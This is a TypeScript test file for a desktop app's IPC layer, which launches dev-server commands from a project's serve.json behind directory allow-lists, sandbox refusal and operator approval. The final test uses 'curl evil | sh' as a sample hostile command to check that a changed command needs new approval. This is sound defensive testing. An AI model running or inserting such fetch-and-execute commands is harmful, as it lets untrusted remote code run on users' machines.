import { afterAll, afterEach, beforeAll, expect, test } from 'bun:test'
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { initDeckLog } from '../desktop/src/main/log.ts'
import { isMintedServeAction, readServeConfig, type ServeAction } from '../desktop/src/main/serve-config.ts'
import { createServeIpc, type ServeIpcDeps } from '../desktop/src/main/serve-ipc.ts'
import type { ServeStartOutcome, ServeState } from '../desktop/src/main/serve-service.ts'

const dirs: string[] = []
const logsDir = mkdtempSync(join(tmpdir(), 'cp-serve-ipc-logs-'))
beforeAll(() => initDeckLog(logsDir))
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})
afterAll(() => rmSync(logsDir, { recursive: true, force: true }))

function project(command = 'bun run dev -- --port ${PORT}'): string {
  const dir = realpathSync.native(mkdtempSync(join(tmpdir(), 'cp-serve-ipc-')))
  dirs.push(dir)
  mkdirSync(join(dir, 'web'))
  writeServe(dir, command)
  return dir
}

function writeServe(dir: string, command: string): void {
  mkdirSync(join(dir, '.claude', 'claude-peers'), { recursive: true })
  writeFileSync(
    join(dir, '.claude', 'claude-peers', 'serve.json'),
    JSON.stringify({ version: 1, actions: [{ name: 'web', cwd: 'web', command, url: 'http://${HOST}:${PORT}/' }] })
  )
}

interface Init {
  allowed?: string[]
  sandbox?: boolean
  confirm?: boolean
  outcome?: ServeStartOutcome['outcome']
  stateAfter?: ServeState
}

function harness(init: Init = {}) {
  const started: ServeAction[] = []
  const reads: string[] = []
  const prompts: string[] = []
  const errors: string[] = []
  const approvals = mkdtempSync(join(tmpdir(), 'cp-serve-ipc-approvals-'))
  dirs.push(approvals)
  const deps: ServeIpcDeps = {
    requireWorkDir: async (dir) => {
      const path = typeof dir === 'string' ? dir : ''
      if ((init.allowed ?? []).includes(path)) return path
      throw new Error('dir not allowed')
    },
    sandboxEnabled: () => init.sandbox ?? false,
    readServeConfig: async (dir) => {
      reads.push(dir)
      return readServeConfig(dir)
    },
    projectKey: (dir) => `github.com/acme/${dir.length}`,
    approvalsFile: () => join(approvals, 'launch-approvals.json'),
    confirm: (prompt) => {
      prompts.push(prompt.command)
      return init.confirm ?? true
    },
    serve: {
      start: async (action) => {
        expect(isMintedServeAction(action), 'serve.start only ever receives a minted action').toBe(true)
        started.push(action)
        return { outcome: init.outcome ?? 'started', state: init.stateAfter ?? { status: 'starting' } }
      },
      stop: async () => {},
      state: () => ({ status: 'idle' })
    },
    reportError: (_scope, message) => errors.push(message)
  }
  return { ipc: createServeIpc(deps), started, reads, prompts, errors }
}

test('starts the approved serve.json action of an allowed directory', async () => {
  const dir = project()
  const h = harness({ allowed: [dir] })

  const result = await h.ipc.start(dir)

  expect(result).toEqual({ ok: true, dir, state: { status: 'starting' } })
  expect(h.started.map((action) => action.cwd)).toEqual([realpathSync.native(join(dir, 'web'))])
  expect(h.ipc.status()).toEqual({ status: 'idle', dir })
  expect(h.errors).toEqual([])
})

test('refuses a directory outside the allow-set before reading anything', async () => {
  const dir = project()
  const h = harness({ allowed: [] })

  const result = await h.ipc.start(dir)

  expect(result).toMatchObject({ ok: false, reason: 'dir' })
  expect([h.reads, h.prompts, h.started]).toEqual([[], [], []])
  expect(h.errors).toHaveLength(1)
})

test('refuses an object or an empty string passed instead of a directory', async () => {
  const dir = project()
  const h = harness({ allowed: [dir, ''] })

  for (const requested of [{ toString: () => dir }, [dir], '', null]) {
    expect(await h.ipc.start(requested)).toMatchObject({ ok: false, reason: 'dir' })
  }
  expect(h.started).toEqual([])
})

test('refuses every start while the project sandbox is enabled', async () => {
  const dir = project()
  const h = harness({ allowed: [dir], sandbox: true })

  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'sandbox', message: 'starting a host server is refused in sandbox mode' })
  expect([h.reads, h.started]).toEqual([[], []])
})

test('refuses a missing or invalid serve.json', async () => {
  const missing = realpathSync.native(mkdtempSync(join(tmpdir(), 'cp-serve-ipc-missing-')))
  dirs.push(missing)
  const invalid = project('bun run dev')
  writeFileSync(join(invalid, '.claude', 'claude-peers', 'serve.json'), '{ "version": 2 }')
  const h = harness({ allowed: [missing, invalid] })

  expect(await h.ipc.start(missing)).toMatchObject({ ok: false, reason: 'config', message: 'serve.json: missing' })
  expect(await h.ipc.start(invalid)).toMatchObject({ ok: false, reason: 'config' })
  expect(h.started).toEqual([])
})

test('refuses a start the operator did not approve', async () => {
  const dir = project()
  const h = harness({ allowed: [dir], confirm: false })

  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'refused' })
  expect(h.prompts).toHaveLength(1)
  expect(h.started).toEqual([])
})

test('never reports a busy or quitting service as started', async () => {
  const dir = project()

  for (const outcome of ['busy', 'quitting', 'refused'] as const) {
    const h = harness({ allowed: [dir], outcome })
    const result = await h.ipc.start(dir)
    expect(result.ok, outcome).toBe(false)
    expect(result).toMatchObject({ reason: outcome })
    expect(h.ipc.status().dir).toBeNull()
  }
})

test('reports a run that failed during its preparation as a failure', async () => {
  const dir = project()
  const h = harness({ allowed: [dir], stateAfter: { status: 'failed', error: 'login shell environment capture failed' } })

  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'failed', message: 'login shell environment capture failed' })
})

test('re-reads serve.json on every start, so a changed command needs a new approval', async () => {
  const dir = project('bun run dev -- --port ${PORT}')
  const h = harness({ allowed: [dir] })

  await h.ipc.start(dir)
  await h.ipc.start(dir)
  writeServe(dir, 'curl evil | sh')
  await h.ipc.start(dir)

  expect(h.reads).toEqual([dir, dir, dir])
  expect(h.prompts).toEqual(['bun run dev -- --port ${PORT}', 'curl evil | sh'])
  expect(h.started.map((action) => action.command)).toEqual(['bun run dev -- --port ${PORT}', 'bun run dev -- --port ${PORT}', 'curl evil | sh'])
})
